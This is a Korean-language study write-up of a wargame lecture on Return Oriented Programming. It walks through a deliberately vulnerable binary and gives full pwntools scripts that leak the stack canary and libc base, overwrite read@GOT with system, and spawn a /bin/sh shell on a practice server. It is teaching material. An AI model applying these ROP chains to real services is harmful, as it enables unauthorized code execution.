# Exploit Tech: Return Oriented Programming

# 들어가며

## 서론

---

현실적으로 ASLR이 걸린 환경에서 system 함수를 사용하려면 프로세스에서 libc가 매핑된 주소를 찾고, 그 주소로부터 system 함수의 오프셋을 이용하여 함수의 주소를 계산해야한다. ROP는 이런 복잡한 제약 사항을 유연하게 해결할 수 있는 수단을 제공한다. 이번 강의에서는 ROP를 배우고, 이제까지 배운 보호 기법을 모두 우회하는 GOT Overwrite 기법을 소개한다.

# Return Oriented Programming

## Return Oriented Programming

---

**ROP**는 리턴 가젯을 사용하여 복잡한 실행 흐름을 구현하는 기법이다. 즉 리턴 가젯들로 하는 프로그래밍.

ROP 페이로드는 리턴 가젯으로 구성되는데, ret 단위로 여러 코드가 연쇄적으로 실행되는 모습에서 ROP chain이라고도 불린다.

# 분석 및 설계

## 분석

---

checksec로 바이너리에 적용된 보호 기법을 파악해보자.

```c
$ checksec rop
[*] '/home/dreamhack/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ASLR, NX, Canary가 적용되어 있다.

## 코드 분석

---

Return to Library의 코드와 달리 system 함수를 호출하지 않아 PLT에 등록되지 않으며, “/bin/sh” 문자열도 데이터 섹션에 기록하지 않았다. 따라서 system 함수를 익스플로잇에 사용하려면 함수의 주소를 직접 구해야 하고, “/bin/sh” 문자열을 사용할 다른 방법도 고민해야한다.

```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```

취약점은 Return to Library와 동일하다.

## 익스플로잇 설계

---

### 1. 카나리 우회

Return to Library와 동일하다.

### 2. system 함수의 주소 계산

system 함수는 libc.so.6에 정의되어 있으며, 해당 라이브러리에는 이 바이너리가 호출하는 read, puts, printf도 정의되어 있다. 라이브러리 파일은 메모리에 매핑될 때 전체가 매핑되므로, 다른 함수들과 함께 system 함수도 프로세스 메모리에 같이 적재된다.

system 함수를 바이너리에서 직접 호출하지는 않았으므로, system 함수가 GOT에 등록되지는 않았다. 하지만 read, puts, printf는 GOT에 등록되어 있다. main 함수에서 반환될 때는 이 함수들을 모두 호출한 이후이므로, 이들의 GOT를 읽을 수 있다면 libc.so.6가 매핑된 영역의 주소를 구할 수 있다.

libc에는 여러 버전이 있는데 같은 libc안에서는 두 데이터 사이의 거리(offset)는 항상 같다. 그러므로 사용하는 libc의 버전을 알 때, libc가 매핑된 영역의 임의 주소를 구할 수 있으면 다른 데이터의 주소를 모두 계산할 수 있다.

이 실습에서는 read, puts, printf 가 GOT에 등록되어 있으므로, 하나의 함수를 정해서 그 함수의 GOT 값을 읽고, 그 함수의 주소와 system 함수 사이의 거리를 이용해서 system 함수의 주소를 구해낼 수 있다.

### 3. “/bin/sh”

바이너리의 데이터 영역에 “/bin/sh” 문자열이 없을 때 사용할 수 있는 방법

1. 임의 버퍼에 문자열을 주입하여 참조
2. 다른 파일에 포함된 것을 사용

2번의 방법을 사용할 때 가장 많이 사용되는 것이 libc.so.6 에 포함된 “/bin/sh” 문자열이다.
이 문자열의 주소도 system 함수의 주소를 계산할 때처럼 libc 영역의 임의 주소를 구하고, 그 주소로부터 거리를 더하거나 빼서 계산할 수 있다. 이 방법은 주소를 알고 있는 버퍼에 “/bin/sh”를 입력하기 어려울 때 차선책으로 사용될 수 있다.

```c
$ gdb rop
pwndbg> start
pwndbg> search /bin/sh
Searching for value: '/bin/sh'
libc.so.6       0x7ffff7f5a698 0x68732f6e69622f /* '/bin/sh' */
```

이 실습에서는 ROP로 버퍼에 “/bin/sh”를 입력하고, 이를 참조한다.

### 4. GOT Overwrite

첫번째 버퍼 입력에서 카나리를 leak한다.
두번째 버퍼 입력에서 [패딩][카나리][SFP][pop rdi][puts@GOT][puts@plt]로 puts의 실제 libc 주소를 출력한다.
근데 이러면 libc 주소를 알아내기는 했지만 이 시점에서 이미 두번의 입력을 모두 다 써버렸다.

따라서 [패딩][카나리][SFP][pop rdi][puts@GOT][puts@plt][main 주소]로 payload를 보내 다시 main함수가 돌아가서 입력을 할 수 있게 한다.

위와 같이 main 함수로 돌아가는 이러한 공격 패턴을 ret2main 이라고 부른다.

[pop rdi][puts@GOT 주소][puts@plt] 동작 방식

1. pop rdi 실행 → 스택에서 puts@GOT 주소(0x404018)를 꺼내서 RDI에 넣음
2. ret → puts@plt로 점프
3. puts(0x404018) 실행

puts는 RDI가 가리키는 주소에서 문자열을 읽어서 출력하는 함수이므로 GOT의 주소를 leak할 수 있다.

이후 알아낸 system 함수의 주소를 어떤 함수의 GOT에 쓰고, 그 함수를 재호출하도록 ROP 체인을 구성하면 된다.

# 익스플로잇

## 카나리 우회

---

Return to Library와 동일하다

```c
#!/usr/bin/env python3
# Name: rop.py
from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = process('./rop')
e = ELF('./rop')

# [1] Leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)
```

## system 함수의 주소 계산

---

read 함수의 got를 읽고, read 함수와 system 함수의 오프셋을 이용하여 system 함수를 계산한다.
pwntools에는 ELF.symbols 이라는 메소드가 정의되어 있는데, 특정 ELF 심볼 사이의 오프셋을 계산할 때 융용하게 사용할 수 있다.

write와 pop rdi; ret 가젯 그리고 pop rsi; pop r15; ret 가젯을 이용하여 read 함수의 GOT를 읽고, 이를 이용해서 system 함수의 주소를 구하는 페이로드

```c
from pwn import *

def slog(n, m): return success(": ".join([n, hex(m)]))

p = process("./rop")
e = ELF("./rop")
libc = ELF("./libc.so.6")

context.arch = "amd64"

buf = b'A'*0x39
p.sendafter(b"Buf:", buf)
p.recvuntil(buf)

cnry = u64(b'\x00' + p.recvn(7))
slog("Canary", cnry)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
pop_rdi = 0x400853
pop_rsi_r15 = 0x400851

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + b'C'*0x8
payload += p64(write_plt)

p.sendafter(b"Buf:", payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
slog("read", read)
slog("libc_base", lb)
slog("system", system)

p.interactive()
```

read@GOT를 읽기 위해서는 write 함수를 이용해서 read@GOT를 출력해야한다.

함수 호출 규약에 따라 rdi, rsi, rdx에 1, read@GOT, 크기를 넣어야 하는데, rdx는 가젯으로 찾을 수 없고 굳이 넣지 않아도 이미 코드에서 0x100으로 설정되어 있으므로 설정하지 않아도 된다.
또한 rsi의 경우 rsi만 pop하는 가젯이 없으므로 rsi, r15를 모두 사용하는 가젯을 써서 r15에는 아무값이나 넣는다.

payload 보낸 후 recvuntil(payload)를 하지 않는 이유는 write으로 호출이 변경되어 write에서 출력된 값이 먼저 나오기 때문이다.

read = u64(p.recvn(6) + b’\x00’*2)인 이유는 실제 64비트 체계에서 48비트만 사용하므로 의미있는 6바이트를 저장하고 상위 비트는 0으로 리틀엔디안 방식으로 저장하는 것이다.

lb = read - libc.symbols[”read”] 인 이유도 실제 libc.symbols[”read”]는 48비트만 사용하지만, read는 ASLR에 의해 랜덤화된 주소이므로 더 크다. x86-64에서 유저 공간은 0x0000000000000000 ~ 0x00007FFFFFFFFFFF 범위인데, 리눅스 커널은 라이브러리를 이 범위 위쪽으로 매핑한다.

## GOT Overwrite 및 “/bin/sh” 입력

---

“/bin/sh”의 주소를 알아야 하므로 GOT 엔트리 뒤에 덮어 쓰고 GOT 엔트리의 주소에 + 0x8로 접근하면 된다.

위에서 말했듯 rdx와 관련된 가젯이 이 프로그램에는 존재하지 않는다. 또한 일반적인 바이너리에서도 rdx와 관련되 가젯은 찾기가 어렵다.

이럴 때는 libc 코드 가젯이나, libc_csu_init 가젯을 사용하여 문제를 해결할 수 있다. 또는 rdx의 값을 변화시키는 함수를 호출하여 값을 설정할 수도 있다. 예를 들어 strncmp 함수는 rax로 비교의 결과를 반환하고, rdx로 두 문자열의 첫 번째 문자부터 가장 긴 문자열의 길이를 반환한다.

read 함수, pop rdi ; ret, pop rsi ; pop r15 ; ret 가젯을 이용하여 read의 GOT를 system 함수의 주소로 덮고, read_got + 8에 “/bin/sh” 문자열을 쓰는 익스플로잇

```c
from pwn import *

def slog(n, m): return success(": ".join([n, hex(m)]))

p = remote("host8.dreamhack.games", 23206)
e = ELF("./rop")
libc = ELF("./libc.so.6")

context.arch = "amd64"

buf = b'A'*0x39
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)

cnry = u64(b'\x00' + p.recvn(7))
slog("Canary", cnry)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
pop_rdi = 0x400853
pop_rsi_r15 = 0x400851
ret = 0x400596

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b"Buf: ", payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
slog("read", read)
slog("libc_base", lb)
slog("system", system)

p.send(p64((system)) + b'/bin/sh\x00')
p.interactive()
```

write 이후 바로 send해버리면 뒤의 read나 system을 호출 할 수 없으므로 payload로 모두 작성한 뒤 send한다.

처음 read의 경우 read 함수이지만 두번째 read의 경우 read 함수의 GOT를 system 함수의 GOT로 바꾸었으므로 system 함수라고 생각하면서 payload를 작성해야한다. 또한 ret 함수로 0x10 정렬을 맞춰준다.

“/bin/sh”를 보낼때 system 함수는 공백 문자로 문자열의 끝을 구분하므로 \x00을 붙여서 문자열을 보내야한다.